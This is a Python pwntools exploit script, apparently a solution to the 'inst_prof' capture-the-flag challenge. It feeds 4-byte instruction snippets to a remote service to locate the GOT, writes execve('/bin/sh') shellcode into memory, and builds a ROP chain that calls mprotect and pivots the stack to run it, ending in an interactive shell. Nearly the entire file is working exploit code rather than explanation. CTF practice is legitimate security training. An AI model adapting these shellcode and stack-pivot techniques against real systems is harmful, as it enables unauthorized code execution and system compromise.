#!/usr/bin/env python2
from pwn import *
from time import sleep
from IPython import embed

ret = "\xc3"
testing = True

if testing:
    #p = process("./inst_prof")
    p = remote("127.0.0.1", 40645)
else:
    #p = remote("inst-prof.ctfcompetition.com", 1337)
    p = remote("loca-prof.ctfcompetition.com", 1337)
    #context.timeout = 0.2
    sleep(5.5)

def writeByteStr(byteString):
    writeCmd = '\x41\xc6\x07'   #mov byte [r15], {}
    incCmd = '\x49\xff\xc7'     #inc r15
    for b in byteString:

        p.send(writeCmd + b)
        p.send(incCmd + ret)

def shiftR15Qword():
    for x in range(8):
        p.send("\x49\xff\xc7\xc3") #inc r15

def main():
    #read inital output:
    print(p.readline())

    #now program is waiting for our 4 bytes
    #first we create our "2nd stack" where we'll store our ROP
    #chain:

    #get text section reference:
    p.send("\x4c\x8b\x2c\x24")  #mov r13, [rsp]

    #constant offset from text.seg.ref to GOT:
    #[rsp] + 0x2014e8 == GOT
    #go 0xa0 further than that to get to blank section
    #total == [rsp] + 0x2014e8 + 0xa0 == 0x201588
    #get offset into r14 (r14 is 0 right now):
    p.send("\x49\x01\xf6" + ret) #add r14, rsi #rsi == 0x1000
    #now double r14 9 times:
    for x in range(0x9):
        p.send("\x4d\x01\xf6" + ret) #add r14, r14
    #now r14 is 0x200000, add another 0x1000:
    p.send("\x49\x01\xf6" + ret) #add r14, rsi

    #0x588 left
    #r11 seems to be 0x246 all the time....
    for x in range(2):
        p.send("\x4d\x01\xde" + ret) #add r14, r11

    #0x5c + 0xa0 left:
    for x in range(0x5c):
        p.send("\x49\xff\xc6" + ret) #inc r14

    #now we have GOT Address, save it:
    p.send("\x4d\x01\xf5" + ret) #add r13, r14
    #clear r14:
    p.send("\x4d\x31\xf6" + ret) #xor r14, r14

    for x in range(0xa0):
        p.send("\x49\xff\xc6" + ret) #inc r14

    #now copy to r15:
    p.send("\x4d\x89\xef" + ret) #mov r15, r13

    #now add r15, r14:
    p.send("\x4d\x01\xf7" + ret) #add r15, r14

    #save second stack pointer
    p.send("\x4d\x89\xfe" + ret) #mov r14, r15

    #get r15 past our saved text section ref
    shiftR15Qword()

    #now lets write our shellcode:
    writeByteStr('\x48\x31\xc0\x48\x89\xec\x50\x48\x89\xe2\x48\xbb\xff\x2f' + \
        '\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x52' + \
        '\x48\x89\xe2\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05')

    #save GOT address at [r14]:
    p.send("\x4d\x89\x2e" + ret) #mov [r14], r13

    #now we need pop rdi gadget
    #pop rdi == [rsp] + 0xab
    p.send("\x4c\x8b\x2c\x24") #mov r13, [rsp]
    for x in range(0xab):
        p.send("\x49\xff\xc5" + ret) #inc r13

    #save pop addr on rop stack:
    p.send("\x4d\x89\x2f" + ret)    #mov [r15], r13

    #save addr of region to be mprotected as 1st rop gadget arg:
    p.send("\x4d\x8b\x2e" + ret) #mov r13, [r14]
    p.send("\x4d\x89\x6f\x08")    #mov [r15+8], r13

    #now we need to call mprotect and jump to shellcode:
    #mprotect is [rsp] - 0xf8
    p.send("\x4c\x8b\x2c\x24") #mov r13, [rsp]
    for x in range(0xf8):
        p.send("\x49\xff\xcd" + ret) #dec r13

    #push mprotect gadget:
    p.send("\x4d\x89\x6f\x10")    #mov [r15+0x10], r13

    #save current second stack pointer into r13:
    p.send("\x4d\x89\xfd" + ret) #mov r13, r15
    #advance pointer 3 words
    for x in range(0x18):
        p.send("\x49\xff\xc5" + ret) #inc r13

    #point r14 to our shellcode
    for x in range(0x8):
        p.send("\x49\xff\xc6" + ret) #inc r14

    #and write shellcode address here:
    p.send("\x4d\x89\x75\x00") #mov [r13], r14

    #embed()
    #now we set rsp == r15 and let it "rip"..heh
    p.send("\x4c\x89\xfc\xc3")

    p.interactive()

if __name__ == "__main__":
    main()
